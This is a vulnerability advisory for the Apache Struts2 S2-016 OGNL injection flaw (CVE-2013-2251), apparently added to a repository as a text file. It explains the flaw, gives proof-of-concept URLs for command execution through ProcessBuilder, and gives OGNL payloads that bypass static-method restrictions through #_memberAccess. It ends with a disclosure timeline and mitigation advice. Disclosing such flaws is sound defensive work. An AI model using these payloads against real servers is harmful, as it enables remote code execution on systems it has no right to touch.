@@ -1,0 +1,164 @@
+CVE Number:         CVE-2013-2251
+Title:              Struts2 Prefixed Parameters OGNL Injection Vulnerability
+Affected Software:  Apache Struts v2.0.0 - 2.3.15
+Credit:             Takeshi Terada of Mitsui Bussan Secure Directions, Inc.
+Issue Status:       v2.3.15.1 was released which fixes this vulnerability
+Issue ID by Vender: S2-016
+
+Overview:
+  Struts2 is an open-source web application framework for Java.
+  Struts2 (v2.0.0 - 2.3.15) is vulnerable to remote OGNL injection which
+  leads to arbitrary Java method execution on the target server. This is
+  caused by insecure handling of prefixed special parameters (action:,
+  redirect: and redirectAction:) in DefaultActionMapper class of Struts2.
+
+Details:
+  <About DefaultActionMapper>
+
+  Struts2's ActionMapper is a mechanism for mapping between incoming HTTP
+  request and action to be executed on the server. DefaultActionMapper is
+  a default implementation of ActionMapper. It handles four types of
+  prefixed parameters: action:, redirect:, redirectAction: and method:.
+
+  For example, redirect prefix is used for HTTP redirect.
+
+  Normal redirect prefix usage in JSP:
+    <s:form action="foo">
+      ...
+      <s:submit value="Register"/>
+      <s:submit name="redirect:http://www.google.com/" value="Cancel"/>
+    </s:form>
+
+  If the cancel button is clicked, redirection is performed.
+
+  Request URI for redirection:
+    /foo.action?redirect:http://www.google.com/
+
+  Resopnse Header:
+    HTTP/1.1 302 Found
+    Location: http://www.google.com/
+
+  Usage of other prefixed parameters is similar to redirect.
+  See Struts2 document for details.
+  https://cwiki.apache.org/confluence/display/WW/ActionMapper
+
+  <How the Attack Works>
+
+  As stated already, there are four types of prefixed parameters.
+
+    action:, redirect:, redirectAction:, method:
+
+  All except for method: can be used for attacks. But regarding action:,
+  it can be used only if wildcard mapping is enabled in configuration.
+  On the one hand, redirect: and redirectAction: are not constrained by
+  configuration (thus they are convenient for attackers).
+
+  One thing that should be noted is that prefixed parameters are quite
+  forceful. It means that behavior of application which is not intended
+  to accept prefixed parameters can also be overwritten by prefixed
+  parameters added to HTTP request. Therefore all Struts2 applications
+  that use DefaultActionMapper are vulnerable to the attack.
+
+  The injection point is name of prefixed parameters.
+  Example of attack using redirect: is shown below.
+
+  Attack URI:
+    /bar.action?redirect:http://www.google.com/%25{1000-1}
+
+  Response Header:
+    HTTP/1.1 302 Found
+    Location: http://www.google.com/999
+
+  As you can see, expression (1000-1) is evaluated and the result (999)
+  is appeared in Location response header. As I shall explain later,
+  more complex attacks such as OS command execution is possible too.
+
+  In DefaultActionMapper, name of prefixed parameter is once stored as
+  ActionMapping object and is later executed as OGNL expression.
+  Rough method call flow in execution phase is as the following.
+
+  org.apache.struts2.dispatcher.ng.filter.StrutsExecuteFilter.doFilter()
+  org.apache.struts2.dispatcher.ng.ExecuteOperations.executeAction()
+  org.apache.struts2.dispatcher.Dispatcher.serviceAction()
+  org.apache.struts2.dispatcher.StrutsResultSupport.execute()
+  org.apache.struts2.dispatcher.StrutsResultSupport.conditionalParse()
+  com.opensymphony.xwork2.util.TextParseUtil.translateVariables()
+  com.opensymphony.xwork2.util.OgnlTextParser.evaluate()
+
+Proof of Concept:
+  <PoC URLs>
+
+  PoC is already disclosed on vender's web page.
+  https://struts.apache.org/release/2.3.x/docs/s2-016.html
+
+  Below PoC URLs are just quotes from the vender's page.
+
+  Simple Expression:
+    http://host/struts2-blank/example/X.action?action:%25{3*4}
+    http://host/struts2-showcase/employee/save.action?redirect:%25{3*4}
+
+  OS Command Execution:
+    http://host/struts2-blank/example/X.action?action:%25{(new+java.lang.ProcessBuilder(new+java.lang.String[]{'command','goes','here'})).start()}
+    http://host/struts2-showcase/employee/save.action?redirect:%25{(new+java.lang.ProcessBuilder(new+java.lang.String[]{'command','goes','here'})).start()}
+    http://host/struts2-showcase/employee/save.action?redirectAction:%25{(new+java.lang.ProcessBuilder(new+java.lang.String[]{'command','goes','here'})).start()}
+
+  Obviously such attacks are not specific to blank/showcase application,
+  but all Struts2 based applications may be subject to attacks.
+
+  <OS Command Execution and Static Method Call>
+
+  Another topic that I think worth mentioning is that PoC URLs use
+  ProcessBuilder class to execute OS commands. The merit of using this
+  class is that it does not require static method to execute OS commands,
+  while Runtime class does require it.
+
+  As you may know, static method call in OGNL is basically prohibited.
+  But in Struts2 <= v2.3.14.1 this restriction was easily bypassed by
+  a simple trick:
+
+  %{#_memberAccess['allowStaticMethodAccess']=true,
+    @java.lang.Runtime@getRuntime().exec('your commands')}
+
+  In Struts v2.3.14.2, SecurityMemberAccess class has been changed to
+  prevent the trick. However there are still some techniques to call
+  static method in OGNL.
+
+  One technique is to use reflection to replace static method call to
+  instance method call. Another technique is to overwrite #_memberAccess
+  object itself rather than property of the object:
+
+  %{#_memberAccess=new com.opensymphony.xwork2.ognl.SecurityMemberAccess(true),
+    @java.lang.Runtime@getRuntime().exec('your commands')}
+
+  Probably prevention against static method is just an additional layer
+  of defense, but I think that global objects such as #_memberAccess
+  should be protected from rogue update.
+
+Timeline:
+  2013/06/24  Reported to Struts Security ML
+  2013/07/17  Vender announced v2.3.15.1
+  2013/08/10  Disclosure of this advisory
+
+Recommendation:
+  Immediate upgrade to the latest version is strongly recommended as
+  active attacks have already been observed. It should be noted that
+  redirect: and redirectAction: parameters were completely dropped and
+  do not work in the latest version as stated in the vender's page.
+  Thus attention for compatibility issues is required for upgrade.
+
+  If you cannot upgrade your Struts2 immediately, filtering (by custom
+  servlet filter, IPS, WAF and so on) can be a mitigation solution for
+  this vulnerability. Some points about filtering solution are listed
+  below.
+
+  - Both %{expr} and ${expr} notation can be used for attacks.
+  - Parameters both in querystring and in request body can be used.
+  - redirect: and redirectAction: can be used not only for Java method
+    execution but also for open redirect.
+
+  See S2-017 (CVE-2013-2248) for open redirect issue.
+  https://struts.apache.org/release/2.3.x/docs/s2-017.html
+
+Reference:
+  https://struts.apache.org/release/2.3.x/docs/s2-016.html
+  https://cwiki.apache.org/confluence/display/WW/ActionMapper
